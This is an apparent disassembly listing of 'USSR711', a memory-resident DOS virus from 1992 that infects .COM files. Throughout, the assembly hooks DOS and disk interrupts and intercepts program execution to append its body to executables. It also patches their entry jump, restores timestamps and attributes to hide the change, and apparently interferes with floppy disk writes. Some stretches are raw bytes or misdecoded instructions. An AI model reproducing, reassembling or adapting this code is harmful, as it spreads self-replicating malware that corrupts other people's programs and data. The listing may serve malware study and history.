
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        USSR711				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   9-Feb-92					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: AW		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	20h
data_2e		equ	22h
data_3e		equ	4Ch
data_4e		equ	4Eh
data_5e		equ	84h
data_6e		equ	86h
data_7e		equ	0D9h
data_8e		equ	0DBh
data_9e		equ	122h
data_10e	equ	124h
data_11e	equ	13Ah
data_12e	equ	13Ch
data_13e	equ	441h
data_14e	equ	3
data_15e	equ	12h
data_16e	equ	0
data_17e	equ	0B0h
data_18e	equ	0B2h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

ussr711		proc	far

start:
		jmp	loc_1
		int	21h			; DOS Services  ah=function 00h
						;  terminate, cs=progm seg prefx
		call	sub_1

ussr711		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pop	bx
		xor	di,di			; Zero register
		mov	si,bx
		sub	si,3
		mov	ax,4B04h
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,44Bh
loc_1:
		call	sub_2

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_2:
		pop	bx
		xor	di,di			; Zero register
		mov	si,bx
		sub	si,3
		mov	ax,4B04h
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,44Bh
		je	$+7Dh			; Jump if equal
		mov	ax,es
		dec	ax
		mov	es,ax
		mov	ax,es:data_14e
		sub	ax,2Ch
		mov	es:data_14e,ax
		sub	word ptr es:data_15e,2Ch
		nop
		mov	es,es:data_15e
		mov	cx,2BBh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	cx,ds:data_5e
		mov	es:data_11e,cx
		mov	cx,ds:data_6e
		mov	es:data_12e,cx
		mov	word ptr ds:data_5e,126h
		mov	ds:data_6e,es
		mov	cx,ds:data_1e
		mov	es:data_7e,cx
		mov	cx,ds:data_2e
		mov	es:data_8e,cx
		mov	word ptr ds:data_1e,0B4h
		mov	ds:data_2e,es
		mov	cx,ds:data_3e
		mov	es:data_9e,cx
		mov	cx,ds:data_4e
		mov	es:data_10e,cx
		mov	word ptr ds:data_3e,0DDh
		mov	ds:data_4e,es
		sti				; Enable interrupts
		mov	di,100h
		mov	si,bx
		add	si,2B3h
		mov	cx,3
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,cs
		mov	es,ax
		mov	ds,ax
		xor	ax,ax			; Zero register
		mov	si,ax
		mov	di,0
		mov	bx,offset start
		jmp	bx			; Register jump
		add	bl,[si]
		db	 67h, 6Fh, 50h, 2Eh,0A1h,0B2h
		db	 00h, 40h, 2Eh,0A3h,0B2h, 00h
		db	 2Eh,0A1h,0B0h, 00h, 3Dh, 00h
		db	 00h, 75h, 10h, 2Eh, 81h, 3Eh
		db	0B2h, 00h, 74h, 37h, 75h, 07h
		db	0B8h, 02h, 1Ch, 2Eh,0A3h,0B0h
		db	 00h
		db	 58h,0EAh, 0Ah, 01h, 49h,0D7h
		db	 2Eh, 83h, 3Eh,0B0h, 00h, 00h
		db	 74h, 3Ch, 80h,0FCh, 03h, 74h
		db	 05h, 80h,0FCh, 0Bh
		db	 75h, 32h
loc_3:
		test	dl,80h
		js	loc_4			; Jump if sign=1
		push	ax
		mov	ax,cs:data_18e
		and	ax,3
		pop	ax
		jnz	loc_4			; Jump if not zero
		push	bp
		add	[bp+si+7Dh],dh
		push	ax
		mov	ax,cs
		mov	ds,ax
		mov	ax,[bp+6]
		push	ax
		popf				; Pop flags
		stc				; Set carry flag
		pushf				; Push flags
		pop	ax
		mov	[bp+6],ax
		xor	ax,ax			; Zero register
		mov	ds,ax
		pop	ax
		mov	ah,80h
		mov	ds:data_13e,ah
		pop	ds
		pop	bp
		iret				; Interrupt return
loc_4:
;*		jmp	far ptr loc_20
sub_1		endp

		db	0EAh, 49h, 01h, 08h,0D7h
		cmp	ax,4B04h
		jne	loc_5			; Jump if not equal
		mov	ax,44Bh
		iret				; Interrupt return
loc_5:
		cmp	ax,4B00h
		je	loc_7			; Jump if equal
		cmp	ax,4B03h
		je	loc_7			; Jump if equal
loc_6:
;*		jmp	far ptr loc_19
		db	0EAh,0B5h, 02h, 46h,0D5h
loc_7:
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	si
		push	di
		mov	ax,ds
		mov	es,ax
		cld				; Clear direction
		mov	al,0
		mov	di,dx
		mov	cx,0C8h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		jnz	loc_8			; Jump if not zero
		std				; Set direction flag
		mov	al,2Eh			; '.'
		mov	cx,0Ah
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
loc_8:
		jnz	loc_11			; Jump if not zero
		inc	di
		inc	di
		mov	al,[di]
		and	al,0DFh
		cmp	al,43h			; 'C'
		jne	loc_11			; Jump if not equal
		mov	al,[di+1]
		and	al,0DFh
		cmp	al,4Fh			; 'O'
		jne	loc_11			; Jump if not equal
		mov	al,[di+2]
		and	al,0DFh
		cmp	al,4Dh			; 'M'
		jne	loc_11			; Jump if not equal
		mov	al,[di-2]
		and	al,0DFh
		cmp	al,44h			; 'D'
		jne	loc_9			; Jump if not equal
		mov	al,[di-8]
		and	al,0DFh
		cmp	al,43h			; 'C'
		je	loc_11			; Jump if equal
loc_9:
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		mov	word ptr cs:[2B4h],cx
		mov	cx,20h
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jc	loc_11			; Jump if carry Set
		mov	word ptr cs:[2B0h],ds
		mov	word ptr cs:[2B2h],dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_11			; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		mov	word ptr cs:[2ACh],cx
		mov	word ptr cs:[2AEh],dx
		jmp	short loc_12
		nop
loc_10:
		jmp	loc_6
loc_11:
		jmp	loc_16
loc_12:
		mov	cx,3
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	dx,2B6h
		mov	ax,3F00h
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	cx,0
		mov	dx,word ptr cs:[2B7h]
		add	dx,3
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	cx,0Ah
		mov	dx,29Bh
		mov	ax,3F00h
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		cld				; Clear direction
		mov	cx,0Ah
		mov	si,29Bh
		mov	di,data_16e
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_15			; Jump if zero
		mov	ax,4202h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		cmp	ax,6A4h
		jb	loc_15			; Jump if below
		jmp	short loc_14
		nop
loc_13:
		jmp	short loc_10
loc_14:
		mov	cx,cs:data_18e
		and	cx,0Fh
		add	cx,5
		mov	ax,cs
		mov	ds,ax
		xor	dx,dx			; Zero register
		mov	ax,4000h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_15			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		sub	ax,3
		mov	word ptr cs:[2AAh],ax
		xor	dx,dx			; Zero register
		mov	ax,4000h
		mov	cx,2BBh
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_15			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	ax,cs
		mov	ds,ax
		mov	dx,2A9h
		mov	ax,4000h
		mov	cx,3
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_15:
		mov	ax,5701h
		mov	cx,word ptr cs:[2ACh]
		mov	dx,word ptr cs:[2AEh]
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ax,3E00h
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ds,word ptr cs:[2B0h]
		mov	dx,word ptr cs:[2B2h]
		mov	cx,word ptr cs:[2B4h]
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
loc_16:
		pop	di
		pop	si
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		jmp	short loc_13
		nop
		add	[bx+si],al
		push	ax
		mov	ah,30h			; '0'
		int	21h			; DOS Services  ah=function 30h
						;  get DOS version number ax
		cmp	ax,1E03h
;*		je	loc_17			; Jump if equal
		db	 74h, 09h
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
;*		jmp	loc_18
		db	0E9h, 15h, 00h
		test	ax,3AA5h
		push	ss
		db	0FEh,0B2h,0B9h, 41h, 20h, 00h
		db	0B8h, 00h, 4Ch, 02h, 00h

seg_a		ends



		end	start
